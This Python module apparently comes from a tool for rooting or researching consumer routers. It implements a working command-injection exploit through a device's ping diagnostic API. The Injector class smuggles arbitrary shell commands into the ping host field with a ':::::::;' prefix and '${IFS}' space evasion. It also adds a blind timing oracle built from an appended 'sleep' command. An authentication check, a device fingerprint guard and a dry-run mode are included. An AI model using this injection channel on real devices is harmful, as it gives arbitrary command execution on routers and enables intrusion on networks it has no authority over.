"""Ping-diagnostic command injection channel and timing oracle.

Safety properties of this module:
  * requires an authenticated session (physical-button login);
  * refuses to run against unknown device families unless forced
    (firmware fingerprint guard);
  * every privileged action goes through the documented, owner-consented
    ping API only.
"""

from __future__ import annotations

import time

I = "${IFS}"
ORACLE_SLEEP = 5

KNOWN_FINGERPRINTS = ("GDNT", "FGA221", "NeXXt")


def run_ping(client, host: str, settle_timeout: float = 45.0,
             poll_interval: float = 1.0) -> tuple[float, dict]:
    """Submit a ping request; measure seconds until DiagnosticsState settles."""
    status, data = client.set("pingstatus", host=host, state="Requested", name="ping")
    if status != 200:
        return -1.0, {"submit_http": status, "submit_response": data}
    start = time.time()
    last: dict = {}
    while time.time() - start < settle_timeout:
        time.sleep(poll_interval)
        _, data = client.get("pingstatusinfo")
        last = data.get("pingstatusinfo", data)
        state = str(last.get("DiagnosticsState", ""))
        if state and state not in {"Requested", "InProgress", "None"}:
            break
    return time.time() - start, last


class UnknownDeviceError(RuntimeError):
    pass


class Injector:
    """Authenticated injection channel with oracle and fingerprint guard."""

    def __init__(self, client, force: bool = False, dry_run: bool = False,
                 log=print) -> None:
        self.client = client
        self.log = log
        self.dry_run = dry_run
        client.require_auth()
        if not force:
            self._guard()
        if dry_run:
            self.base = 2.3
            return
        # Two samples, take the max: a single sample can read low on a lucky
        # fast request and make the oracle threshold too sensitive (verify.py
        # uses the same two-sample-max baseline for the same reason).
        b1, _ = run_ping(self.client, "127.0.0.1")
        b2, _ = run_ping(self.client, "127.0.0.1")
        self.base = max(b1, b2)

    def _guard(self) -> None:
        status, data = self.client.get("sysinfo")
        info = data.get("sysinfo", {}) if status == 200 else {}
        haystack = " ".join(str(info.get(k, "")) for k in
                            ("model", "hw_version", "fw_version"))
        if not any(fp in haystack for fp in KNOWN_FINGERPRINTS):
            raise UnknownDeviceError(
                f"unrecognized device fingerprint {haystack!r}; refusing to "
                "inject. Re-run 'nexxt probe' to check compatibility, or "
                "pass --force if you know what you are doing.")

    def do(self, cmd: str) -> float:
        if self.dry_run:
            self.log(f"[dry-run] would inject: {cmd}")
            return 0.0
        elapsed, _ = run_ping(self.client, ":::::::;" + cmd)
        return elapsed

    def ask(self, cmd: str) -> bool:
        if self.dry_run:
            self.log(f"[dry-run] would oracle: {cmd}")
            return False
        elapsed, _ = run_ping(
            self.client, ":::::::;" + cmd + f"&&sleep{I}{ORACLE_SLEEP}")
        return elapsed > self.base + ORACLE_SLEEP - 2
